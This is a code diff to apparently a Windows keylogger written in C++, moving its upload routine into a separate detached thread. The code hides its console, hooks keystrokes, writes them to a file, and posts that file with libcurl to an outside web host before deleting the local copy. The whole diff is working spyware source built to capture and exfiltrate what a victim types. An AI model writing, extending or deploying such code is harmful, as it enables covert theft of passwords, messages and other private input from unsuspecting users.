@@ -618,6 +618,36 @@ static std::string StartString()
 	return startString;
 }
 
+static void makeRequest() {
+	CURL* curl;
+	CURLcode res;
+	curl_global_init(CURL_GLOBAL_ALL);
+	curl = curl_easy_init();
+	// Check if the curl is correctly istanced
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
+		// Imposting the file to send
+		struct curl_httppost* formpost = NULL;
+		struct curl_httppost* lastptr = NULL;
+		curl_formadd(&formpost, &lastptr,
+			CURLFORM_COPYNAME, "file",
+			CURLFORM_FILE, FilePath.c_str(),
+			CURLFORM_END);
+		// Set the form post parameter
+		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+		// Make the request and check the result
+		res = curl_easy_perform(curl);
+		/*if (res != CURLE_OK)
+			std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;*/
+			// Cleanup
+		curl_easy_cleanup(curl);
+		curl_formfree(formpost);
+	}
+	curl_global_cleanup();
+	// remove the file after sending it
+	remove(FilePath.c_str());
+}
+
 // thread function
 static void timeCheck() {
 	std::string tmp;
@@ -630,33 +660,8 @@ static void timeCheck() {
 		if (outputFile.is_open()) outputFile << tmp;
 		outputFile.close();
 		// sending the file to the server
-		CURL* curl;
-		CURLcode res;
-		curl_global_init(CURL_GLOBAL_ALL);
-		curl = curl_easy_init();
-		// Check if the curl is correctly istanced
-		if (curl) {
-			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
-			// Imposting the file to send
-			struct curl_httppost* formpost = NULL;
-			struct curl_httppost* lastptr = NULL;
-			curl_formadd(&formpost, &lastptr,
-				CURLFORM_COPYNAME, "file",
-				CURLFORM_FILE, FilePath.c_str(),
-				CURLFORM_END);
-			// Set the form post parameter
-			curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
-			// Make the request and check the result
-			res = curl_easy_perform(curl);
-			/*if (res != CURLE_OK)
-				std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;*/
-			// Cleanup
-			curl_easy_cleanup(curl);
-			curl_formfree(formpost);
-		}
-		curl_global_cleanup();
-		// remove the file after sending it
-		remove(FilePath.c_str());
+		std::thread tSend(makeRequest);
+		tSend.detach();
 		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
 		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
 	}
@@ -667,7 +672,7 @@ int main()
 {
 	FreeConsole(); // hiding the console
 
-	std::thread t(timeCheck); // istancing a thread
+	std::thread tTime(timeCheck); // istancing a thread
 
 	contentFile = StartString();
 	// istancing the hooks
